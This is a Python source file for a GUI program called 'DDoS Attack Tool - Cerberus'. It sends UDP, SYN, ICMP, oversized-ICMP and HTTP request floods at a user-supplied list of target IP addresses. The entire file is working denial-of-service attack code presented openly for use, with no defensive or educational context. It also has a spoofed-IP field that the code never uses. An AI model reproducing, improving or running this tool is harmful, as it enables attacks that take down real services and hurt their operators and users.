import threading
import time
import tkinter as tk
import requests
import scapy.all as scapy
import progressbar

class DDoSAttackTool:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DDoS Attack Tool - Cerberus")

        self.target_text = tk.Text(self.root, height=5, width=30)
        self.fake_ip_entry = tk.Entry(self.root)
        self.port_entry = tk.Entry(self.root)
        self.num_packets_entry = tk.Entry(self.root)
        self.burst_interval_entry = tk.Entry(self.root)
        self.attack_type_entry = tk.StringVar(self.root)
        self.attack_type_entry.set("UDP Flood")

        self.attack_types = [
            "UDP Flood", "ICMP Echo", "SYN Flood", "HTTP Flood", "Ping of Death"
        ]

        self.attack_num = 0

        self.create_gui()

    def create_gui(self):
        tk.Label(self.root, text="Enter IP Addresses of The Targets (one per line)").pack()
        self.target_text.pack()

        tk.Label(self.root, text="Enter The Spoofed IP Address").pack()
        self.fake_ip_entry.pack()

        tk.Label(self.root, text="Enter The Port Number").pack()
        self.port_entry.pack()

        tk.Label(self.root, text="Enter Number of Packets to Send").pack()
        self.num_packets_entry.pack()

        tk.Label(self.root, text="Enter Burst Interval (in seconds)").pack()
        self.burst_interval_entry.pack()

        tk.Label(self.root, text="Select Attack Type").pack()
        attack_type_menu = tk.OptionMenu(self.root, self.attack_type_entry, *self.attack_types)
        attack_type_menu.pack()

        tk.Button(self.root, text="Start Attack", command=self.start_attack).pack()

    def start_attack(self):
        target_ips = self.target_text.get("1.0", tk.END).strip().split("\n")
        fake_ip = self.fake_ip_entry.get()
        port = int(self.port_entry.get())
        num_packets = int(self.num_packets_entry.get())
        burst_interval = float(self.burst_interval_entry.get())
        attack_type = self.attack_type_entry.get()

        if attack_type == "UDP Flood":
            attack_thread = threading.Thread(target=self.udp_flood_attack,
                                             args=(target_ips, port, num_packets, burst_interval))
        elif attack_type == "ICMP Echo":
            attack_thread = threading.Thread(target=self.icmp_echo_attack,
                                             args=(target_ips, num_packets, burst_interval))
        elif attack_type == "SYN Flood":
            attack_thread = threading.Thread(target=self.syn_flood_attack,
                                             args=(target_ips, port, num_packets, burst_interval))
        elif attack_type == "HTTP Flood":
            attack_thread = threading.Thread(target=self.http_flood_attack,
                                             args=(target_ips, port, num_packets, burst_interval))
        elif attack_type == "Ping of Death":
            attack_thread = threading.Thread(target=self.ping_of_death_attack,
                                             args=(target_ips, num_packets, burst_interval))
        else:
            print("Invalid attack type selected.")
            return

        attack_thread.start()

    def udp_flood_attack(self, target_ips, port, num_packets, burst_interval):
        try:
            for target in target_ips:
                for _ in range(num_packets):
                    scapy.send(scapy.IP(dst=target) / scapy.UDP(dport=port) / scapy.RandString(1024))
                    self.attack_num += 1
                    print(f"Sent {self.attack_num} packet to {target} through port: {port}")
                    time.sleep(burst_interval)
                port = (port + 1) % 65535  # Move this line outside the inner loop
        except  Exception as  e:
            print("An error occurred during the UDP flood attack:", e)

    def icmp_echo_attack(self, target_ips, num_packets, burst_interval):
        try:
            for target in target_ips:
                for _ in range(num_packets):
                    scapy.send(scapy.IP(dst=target) / scapy.ICMP())
                    self.attack_num += 1
                    print(f"Sent {self.attack_num} ICMP echo request to {target}")
                    time.sleep(burst_interval)
        except  Exception as  e:
            print("An error occurred during the ICMP echo attack:", e)

    def syn_flood_attack(self, target_ips, port, num_packets, burst_interval):
        try:
            for target in target_ips:
                for _ in range(num_packets):
                    scapy.send(scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"))
                    self.attack_num += 1
                    port = (port + 1) % 65535
                    print(f"Sent {self.attack_num} SYN packet to {target} through port: {port}")
                    time.sleep(burst_interval)
        except  Exception as  e:
            print("An error occurred during the SYN flood attack:", e)

    def http_flood_attack(self, target_ips, port, num_packets, burst_interval):
        try:
            urls = [f"http://{target}:{port}/" for target in target_ips]
            headers = {
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
            }

            with progressbar.ProgressBar(max_value=num_packets) as bar:
                for url in urls:
                    for i in range(num_packets):
                        requests.get(url, headers=headers)
                        self.attack_num += 1
                        print(f"Sent {self.attack_num} HTTP request to {url}")
                        time.sleep(burst_interval)
                        bar.update(i + 1)
        except  Exception as  e:
            print("An error occurred during the HTTP flood attack:", e)

    def ping_of_death_attack(self, target_ips, num_packets, burst_interval):
        try:
            for target in target_ips:
                for _ in range(num_packets):
                    scapy.send(scapy.IP(dst=target) / scapy.ICMP() / ("X" * 60000))
                    self.attack_num += 1
                    print(f"Sent {self.attack_num} oversized ICMP packet to {target}")
                    time.sleep(burst_interval)
        except  Exception as  e:
            print("An error occurred during the Ping of Death attack:", e)

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    tool = DDoSAttackTool()
    tool.run()
